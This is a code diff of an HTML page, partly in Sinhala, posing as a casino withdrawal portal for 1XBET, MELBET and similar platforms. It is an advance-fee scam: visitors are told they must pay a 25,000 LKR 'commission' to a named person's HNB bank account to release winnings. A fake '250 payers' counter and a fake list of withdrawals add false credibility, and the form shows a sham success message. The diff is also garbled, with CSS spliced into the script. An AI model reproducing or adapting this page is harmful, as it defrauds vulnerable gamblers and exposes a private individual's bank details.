@@ -169,6 +169,178 @@
                 <thead>
                   <tr>
                     <th>player id</th>
+                    <th>email / platform</th>
+                    <th>widrowal</th>
+                  </tr>
+                </thead>
+                <tbody id="playerBody"></tbody>
+              </table>
+            </div>
+          </div>
+        </div>
+        <!-- Player Withdrawals Table End -->
+
+      </div>
+      <div style="width:150px;text-align:right">
+        <div class="pill">
+          <div style="text-align:right">
+            <div style="font-size:12px;color:var(--muted)">Commission Rate</div>
+            <div class="big">10%</div>
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <div class="card" style="margin-top:18px">
+      <form id="withdrawForm">
+        <div class="row">
+          <div class="label">Reference Code</div>
+          <input type="text" id="refCode" placeholder="Enter your WDR code" required />
+        </div>
+        <div class="row">
+          <div class="label">Full Name</div>
+          <input type="text" id="fullname" placeholder="Enter your full name" required />
+        </div>
+        <div class="row">
+          <div class="label">Game UID / Account ID</div>
+          <input type="text" id="uid" placeholder="e.g., 12345678" required />
+        </div>
+        <div class="row">
+          <div class="label">Withdrawal Amount</div>
+          <select id="amount">
+            <option value="250000">250,000 LKR</option>
+            <option value="500000">500,000 LKR</option>
+            <option value="750000">750,000 LKR</option>
+            <option value="1000000">1,000,000 LKR</option>
+          </select>
+        </div>
+        <div class="row">
+          <div class="label">Commission (Rate 10%)</div>
+          <input type="text" id="commission" readonly />
+        </div>
+        <div class="row">
+          <div class="label">Payment Screenshot</div>
+          <input type="file" id="screenshot" accept="image/png, image/jpeg" />
+        </div>
+        <button class="withdraw-btn" type="submit">🔒 Withdrawal Now</button>
+        <div class="note">By continuing, you agree to our Terms and Refund Policy.</div>
+      </form>
+
+      <div class="bank-note">
+<strong>IPAY ගිණුමක් අවශ්‍ය නොමැත</strong>, QR SCAN කරන්න අවශ්‍ය නොමැත.
+මෙම <strong>HNB ගිණුමට</strong> මුදල් බැර කිරීමට ඔබට පහසුකම් සපයා ඇත.
+
+ඔබ කොමිෂන් මුදල <strong>25,000 LKR</strong> ගෙවීම් කර ඔබගේ අදාළ කැසිනෝ ගිණුම තුල ඇති මුදල් ඔබගේ ඕනෑම බැංකු ගිණුමකට ගැනීමට අවස්ථාව ඇත.
+
+<strong>Bank Details:</strong>
+Account Number: 050020447732
+Bank: HNB Bank
+Branch: Embilipitiya (535)
+Account Holder: MR K N SHASHIPRIYA
+      </div>
+
+      <div class="red-box" aria-live="polite">
+        1XBET MELBET 888STRZ PARIPULS LINEBET CRASH හෝ APPLE HACK හරහා සොයන ලද මුදල ඔබට කිසිම විටෙක කිසිම ඒජන්ට් වරයෙකු හරහා හෝ ඔබට තනිවම ගැනීමට නොහැක.
+        මීට හේතුව නම් ඔබ අනිවාර්යෙන් මෙම කොමිෂන් මුදල අනිවාර්යෙන් ගෙවා අවසන් කළ පසු ඔබට ඕනෑම මුදලක් ඔබට ඒජන්ට් වරයෙකු හෝ ඔබට තනිවම හෝ ලබා ගැනීමට හැක. ස්තුතියි.
+
+        <div class="counter-wrap">
+          <div class="counter-label">25,000 LKR මුදල් ගෙවූ පිරිස:</div>
+          <div id="counter" class="counter-value" aria-hidden="true">250</div>
+        </div>
+      </div>
+
+      <div class="success-box" id="successBox">
+        <h2>✅ Successfully Withdrawal Request</h2>
+        <p id="successMsg"></p>
+      </div>
+    </div>
+  </div>
+
+  <script>
+    const amountEl = document.getElementById('amount');
+    const commEl = document.getElementById('commission');
+    const form = document.getElementById('withdrawForm');
+    const successBox = document.getElementById('successBox');
+    const successMsg = document.getElementById('successMsg');
+    const platform = document.getElementById('platform');
+
+    function updateCommission(){
+      const amt = parseFloat(amountEl.value) || 0;
+      commEl.value = (amt * 0.10).toFixed(2);
+    }
+    amountEl.addEventListener('change', updateCommission);
+    updateCommission();
+
+    form.addEventListener('submit', function(e){
+      e.preventDefault();
+      const name = document.getElementById('fullname').value;
+      const uid = document.getElementById('uid').value;
+
+      successMsg.innerHTML =
+        `<strong>${platform.value}</strong><br><strong>${name}</strong><br>Account ID: ${uid}`;
+
+      successBox.style.display = 'block';      border-radius:12px;
+      box-shadow:0 6px 18px rgba(255,255,255,0.1);
+      padding:16px;
+      margin-top:18px;
+      overflow:hidden;
+      max-width:100%;
+    }
+    .scroll-card h2{font-size:20px;color:#ffffff;margin:0 0 8px;}
+    .scroll-card p{font-size:14px;color:#ffffff;margin:0 0 12px;}
+    table{
+      width:100%;
+      border-collapse:collapse;
+      font-size:0.9rem;
+    }
+    th,td{
+      padding:8px 10px;
+      border-bottom:1px solid #333333;
+      text-align:left;
+      color:#ffffff;
+      vertical-align: top;
+    }
+    th{
+      background:#222222;
+      font-weight:600;
+    }
+    tr:hover td{
+      background: rgba(255,255,255,0.05);
+    }
+    td[contenteditable]{background:#111111;}
+    .small{font-size:0.75rem;color:#aaaaaa;}
+    .scroll-container{overflow:hidden;max-height:250px;position:relative;}
+    .scroll-inner{display:block;}
+  </style>
+</head>
+<body>
+  <div class="container">
+    <div style="margin-bottom:16px;">
+      <label for="platform" class="label">Select Platform</label>
+      <select id="platform">
+        <option value="1XBET">1XBET</option>
+        <option value="MELBET">MELBET</option>
+        <option value="888STRZ">888STRZ</option>
+        <option value="LINEBET">LINEBET</option>
+        <option value="PARIPULS">PARIPULS</option>
+      </select>
+    </div>
+
+    <div class="header">
+      <div style="flex:1">
+        <h1>Complete your <span class="accent">Withdrawal Request</span></h1>
+        <p class="lead">Fast, secure, and transparent. You will receive access details at your email after successful payment and review.</p>
+
+        <!-- Player Withdrawals Table Start -->
+        <div class="scroll-card">
+          <h2>player withdrawals</h2>
+          <p>25000 lkr කොමිෂන් මුදල ගෙවීම් කර, මුදල් widrowal කරන ලද සාමාජිකන් පහත දැක්වෙයි</p>
+          <div class="scroll-container" id="scrollContainer">
+            <div class="scroll-inner" id="scrollInner">
+              <table>
+                <thead>
+                  <tr>
+                    <th>player id</th>
                     <th>email</th>
                     <th>widrowal</th>
                   </tr>
